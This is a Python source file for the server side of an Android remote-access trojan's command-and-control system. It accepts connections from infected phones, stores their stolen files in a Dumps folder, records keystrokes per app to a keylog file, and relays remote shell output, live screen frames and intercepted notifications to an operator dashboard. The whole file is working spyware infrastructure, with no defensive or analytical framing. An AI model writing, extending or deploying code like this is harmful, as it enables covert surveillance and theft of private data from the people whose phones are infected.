import asyncio
import struct
import json
import os
import base64
from datetime import datetime

from server.crypto import CryptoManager
from server.protocol import Protocol
from server.database import Database
from server.logger import log

DUMPS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "Dumps")


class ClientHandler:
    def __init__(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                 crypto: CryptoManager, db: Database, server: 'C2Server'):
        self.reader = reader
        self.writer = writer
        self.crypto = crypto
        self.db = db
        self.server = server
        self.addr = writer.get_extra_info('peername')
        self.device_id = ""
        self.device_info = {}
        self.session_id = None
        self.alive = True

    async def send_message(self, message: dict):
        try:
            packed = Protocol.pack_message(message, self.crypto)
            self.writer.write(packed)
            await self.writer.drain()
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.alive = False
        except Exception as e:
            log.error(f"Send failed [{self.device_id[:8]}]: {e}")
            self.alive = False

    async def recv_message(self):
        try:
            length_data = await self.reader.readexactly(4)
            length = struct.unpack(">I", length_data)[0]
            if length > 50_000_000:
                log.error(f"Oversized message from {self.device_id[:8]}: {length}")
                return None
            payload = await self.reader.readexactly(length)
            return Protocol.unpack_message(payload, self.crypto)
        except asyncio.IncompleteReadError:
            return None
        except (ConnectionResetError, BrokenPipeError, OSError):
            return None
        except Exception as e:
            log.error(f"Recv failed [{self.device_id[:8]}]: {e}")
            return None

    async def handle(self):
        try:
            msg = await self.recv_message()
            if not msg or msg.get("type") != Protocol.TYPE_HANDSHAKE:
                log.error(f"Bad handshake from {self.addr}")
                return

            self.device_id = msg.get("device_id", "unknown")
            self.device_info = {
                "model": msg.get("model", "Unknown"),
                "android_version": msg.get("android_version", "?"),
                "manufacturer": msg.get("manufacturer", ""),
            }

            expected_hash = CryptoManager.get_key_hash(self.crypto.passphrase)
            if msg.get("key_hash") != expected_hash:
                log.error(f"Key mismatch [{self.device_id[:8]}]")
                return

            self.db.upsert_device(
                self.device_id,
                model=self.device_info["model"],
                manufacturer=self.device_info.get("manufacturer", ""),
                android_version=self.device_info["android_version"],
                ip_address=self.addr[0]
            )
            self.session_id = self.db.start_session(self.device_id, self.addr[0])
            await self.server.add_client(self.device_id, self)
            await self.send_message({"type": "handshake_ack", "status": "ok"})

            log.success(
                f"Device online: {self.device_info['model']} "
                f"(Android {self.device_info['android_version']}) "
                f"from {self.addr[0]}"
            )
            self.server.notify_device_connected(self.device_id, self.device_info, self.addr[0])

            while self.alive:
                msg = await self.recv_message()
                if msg is None:
                    break
                await self._dispatch(msg)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error(f"Handler error [{self.device_id[:8]}]: {e}")
        finally:
            await self._cleanup()

    async def _dispatch(self, msg: dict):
        handlers = {
            Protocol.TYPE_HEARTBEAT: self._on_heartbeat,
            Protocol.TYPE_RESPONSE: self._on_response,
            Protocol.TYPE_STREAM: self._on_stream,
            Protocol.TYPE_SHELL_IO: self._on_shell_io,
            Protocol.TYPE_KEYLOG: self._on_keylog,
            Protocol.TYPE_SCREEN_FRAME: self._on_screen_frame,
            Protocol.TYPE_NOTIFICATION: self._on_notification,
        }
        msg_type = msg.get("type")
        if msg_type == Protocol.TYPE_DISCONNECT:
            self.alive = False
            return
        handler = handlers.get(msg_type)
        if handler:
            try:
                await handler(msg)
            except Exception as e:
                log.error(f"Dispatch error [{msg_type}]: {e}")

    async def _on_heartbeat(self, msg: dict):
        info = msg.get("info", {})
        self.db.upsert_device(
            self.device_id,
            model=info.get("model", self.device_info.get("model", "")),
            android_version=info.get("android_version", self.device_info.get("android_version", "")),
            ip_address=self.addr[0],
            battery_level=info.get("battery", -1),
            wifi_ssid=info.get("wifi", "")
        )
        self.device_info.update(info)
        self.server.notify_heartbeat(self.device_id, info)

    async def _on_response(self, msg: dict):
        data = msg.get("data", {})
        log.device(self.device_id, f"Response [{msg.get('status', '?')}]: {json.dumps(data)[:200]}")
        self.server.notify_response(self.device_id, msg)

    async def _on_stream(self, msg: dict):
        filename = msg.get("filename", "unknown")
        data_b64 = msg.get("data", "")
        try:
            raw = base64.b64decode(data_b64)
            device_dir = os.path.join(DUMPS_DIR, self.device_id[:12])
            os.makedirs(device_dir, exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_name = f"{ts}_{os.path.basename(filename)}"
            path = os.path.join(device_dir, safe_name)
            with open(path, "wb") as f:
                f.write(raw)
            ext = safe_name.rsplit(".", 1)[-1].lower() if "." in safe_name else "bin"
            type_map = {
                "jpg": "image", "jpeg": "image", "png": "image",
                "mp4": "video", "avi": "video",
                "mp3": "audio", "wav": "audio",
                "txt": "text", "log": "text",
            }
            ftype = type_map.get(ext, "file")
            self.db.log_file(self.device_id, safe_name, ftype, path, len(raw))
            log.success(f"Saved: {safe_name} ({len(raw)} bytes)")
            self.server.notify_file_received(self.device_id, safe_name, ftype, len(raw))
        except Exception as e:
            log.error(f"Stream save error: {e}")

    async def _on_shell_io(self, msg: dict):
        output = msg.get("data", {}).get("output", "")
        self.server.notify_shell_output(self.device_id, output)

    async def _on_keylog(self, msg: dict):
        data = msg.get("data", {})
        app_name = data.get("app", "unknown")
        text = data.get("text", "")
        if not text:
            return
        self.db.log_keylog(self.device_id, app_name, text)
        device_dir = os.path.join(DUMPS_DIR, self.device_id[:12])
        os.makedirs(device_dir, exist_ok=True)
        keylog_path = os.path.join(device_dir, "keylog.txt")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with open(keylog_path, "a", encoding="utf-8") as f:
                f.write(f"[{ts}] [{app_name}] {text}\n")
        except OSError:
            pass
        log.info(f"Keylog [{self.device_id[:8]}]: [{app_name}] {text[:80]}")
        self.server.notify_keylog(self.device_id, data)

    async def _on_screen_frame(self, msg: dict):
        frame = msg.get("data", "")
        if frame:
            self.server.notify_screen_frame(self.device_id, frame)

    async def _on_notification(self, msg: dict):
        data = msg.get("data", {})
        package = data.get("package", "unknown")
        title = data.get("title", "")
        content = data.get("content", "")
        if title or content:
            self.db.log_notification(self.device_id, package, title, content)
            log.info(f"Notif [{self.device_id[:8]}]: [{package}] {title}: {content[:60]}")
            self.server.notify_notification_intercepted(self.device_id, data)

    async def send_command(self, cmd: str, args: dict = None):
        message = Protocol.create_command(cmd, args)
        self.db.log_command(self.device_id, cmd, json.dumps(args or {}))
        log.command(self.device_id, cmd)
        await self.send_message(message)

    async def _cleanup(self):
        self.alive = False
        try:
            self.writer.close()
            await self.writer.wait_closed()
        except Exception:
            pass
        if self.device_id:
            self.db.set_device_offline(self.device_id)
            if self.session_id:
                self.db.end_session(self.session_id)
            await self.server.remove_client(self.device_id)
            log.warning(f"Device offline: {self.device_id[:8]}")
            self.server.notify_device_disconnected(self.device_id)


class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 8000, passphrase: str = None):
        self.host = host
        self.port = port
        self.crypto = CryptoManager(passphrase)
        self.db = Database()
        self.clients: dict[str, ClientHandler] = {}
        self._lock = asyncio.Lock()
        self._server = None
        self._shutdown = asyncio.Event()
        self.socketio = None
        self._loop = None

    def set_socketio(self, sio):
        self.socketio = sio

    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info('peername')
        log.info(f"Connection from {addr[0]}:{addr[1]}")
        handler = ClientHandler(reader, writer, self.crypto, self.db, self)
        await handler.handle()

    async def start(self):
        self._loop = asyncio.get_running_loop()
        for dev in self.db.get_all_devices():
            self.db.set_device_offline(dev["device_id"])

        self._server = await asyncio.start_server(
            self._handle_connection, self.host, self.port
        )
        log.info(f"C2 listening on {self.host}:{self.port}")

        async with self._server:
            await self._shutdown.wait()

    def stop(self):
        self._shutdown.set()
        if self._server:
            self._server.close()
        log.info("C2 stopped")

    async def add_client(self, device_id: str, handler: ClientHandler):
        async with self._lock:
            if device_id in self.clients:
                old = self.clients[device_id]
                old.alive = False
                try:
                    old.writer.close()
                except Exception:
                    pass
            self.clients[device_id] = handler

    async def remove_client(self, device_id: str):
        async with self._lock:
            self.clients.pop(device_id, None)

    def get_client(self, device_id: str):
        return self.clients.get(device_id)

    async def send_command_async(self, device_id: str, cmd: str, args: dict = None) -> bool:
        client = self.get_client(device_id)
        if client and client.alive:
            await client.send_command(cmd, args)
            return True
        return False

    def send_command(self, device_id: str, cmd: str, args: dict = None) -> bool:
        client = self.get_client(device_id)
        if client and client.alive and self._loop:
            asyncio.run_coroutine_threadsafe(
                client.send_command(cmd, args), self._loop
            )
            return True
        return False

    def get_connected_devices(self) -> list:
        return list(self.clients.keys())

    # — Socket.IO notifications (called from async context, emit is thread-safe) —

    def notify_device_connected(self, device_id, info, ip):
        if self.socketio:
            self.socketio.emit("device_connected", {"device_id": device_id, "info": info, "ip": ip})

    def notify_device_disconnected(self, device_id):
        if self.socketio:
            self.socketio.emit("device_disconnected", {"device_id": device_id})

    def notify_heartbeat(self, device_id, info):
        if self.socketio:
            self.socketio.emit("heartbeat", {"device_id": device_id, "info": info})

    def notify_response(self, device_id, response):
        if self.socketio:
            self.socketio.emit("command_response", {"device_id": device_id, "response": response})

    def notify_file_received(self, device_id, filename, file_type, file_size):
        if self.socketio:
            self.socketio.emit("file_received", {
                "device_id": device_id, "filename": filename,
                "file_type": file_type, "file_size": file_size
            })

    def notify_shell_output(self, device_id, output):
        if self.socketio:
            self.socketio.emit("shell_output", {"device_id": device_id, "output": output})

    def notify_keylog(self, device_id, data):
        if self.socketio:
            self.socketio.emit("keylog_data", {"device_id": device_id, "data": data})

    def notify_screen_frame(self, device_id, frame_b64):
        if self.socketio:
            self.socketio.emit("screen_frame", {"device_id": device_id, "frame": frame_b64})

    def notify_notification_intercepted(self, device_id, data):
        if self.socketio:
            self.socketio.emit("notification_data", {"device_id": device_id, "data": data})
